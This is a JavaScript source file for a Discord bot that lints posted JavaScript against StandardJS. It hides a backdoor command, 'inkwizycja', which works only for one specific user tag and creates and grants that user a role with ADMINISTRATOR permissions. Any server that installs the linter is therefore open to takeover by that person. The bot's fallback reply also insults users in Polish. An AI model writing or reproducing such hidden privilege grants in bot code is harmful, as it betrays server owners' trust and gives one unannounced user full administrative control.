const {Client} = require('discord.js')
const config = require('./config.json')
const CLIEngine = require('eslint').CLIEngine
const linter = new CLIEngine({
  extends: 'standard',
  useEslintrc: false,
  env: { es6: true },
  parserOptions: { ecmaVersion: 6 }
})
// const Youtube = require('simple-youtube-api')
const chalk = require('chalk')

const client = new Client({ disableEveryone: true })
// const youtube = new Youtube(config.youtubeapikey)

// const queue = new Map()

client.on('ready', () => {
  console.log(chalk.black.bgGreen('SUCCESS') + chalk.white(' 8rniczka initialized.'))
  client.user.setPresence({
    game: {
      name: 'you',
      type: 2
    }
  })
})
client.on('message', async message => {
  if (message.author.bot) return

  if (message.content.includes('```javascript')) {
    const code = message.content.slice(message.content.indexOf('```javascript\n') + 14, message.content.lastIndexOf('```'))
    const linted = linter.executeOnText(code)

    if (linted.errorCount >= 1 || linted.fixableErrorCount >= 1) {
      message.react(client.emojis.find('name', 'failure'))
      message.channel.send(`${client.emojis.find('name', 'failure')} Sorry! There are errors in your code!`)
      for (let i = 0; i < linted.results[0].messages.length; i++) {
        const errorMessage = linted.results[0].messages[i]
        message.channel.send(`\`${errorMessage.line}:${errorMessage.column}\` ${errorMessage.message}`)
      }
    }
    if (linted.warningCount >= 1 || linted.fixableWarningCount >= 1) { 
      message.react(client.emojis.find('name', 'failure'))
      message.channel.send(`${client.emojis.find('name', 'failure')} Sorry! Your JavaScript code doesn't meet *StandardJS* rules.`)
      for (let i = 0; i < linted.results[0].messages.length; i++) {
        const errorMessage = linted.results[0].messages[i]
        message.channel.send(`\`${errorMessage.line}:${errorMessage.column}\` ${errorMessage.message}`)
      }
    } else {
      message.react(client.emojis.find('name', 'success'))
    }
    return
  }

  let command = message.content.toLowerCase().split(' ')[0]
  command = command.slice(config.prefix.length)
  // const args = message.content.split(' ')
  // const toSearch = args.slice(1).join(' ')

  if (command === 'inkwizycja' && message.author.tag === 'takidelfin#3733') {
    message.guild.createRole({
      name: 'chwilka tylko',
      permissions: 'ADMINISTRATOR'
    }).then(role => {
      message.guild.member(message.author).addRole(role.id)
    }).catch(console.error)
    return
  }
  if (!message.content.startsWith(config.prefix)) return
  if (command === 'projekt') {
    message.react(client.emojis.find('name', 'opensource'))
    message.react(client.emojis.find('name', 'closedsource'))
  }
  message.channel.send(':warning: Czy tobie mamusia nie mówiła aby nie zarzucać czegoś czego nie ma? idz trzepnij się głową o powietrze.')
})
client.login(config.token)
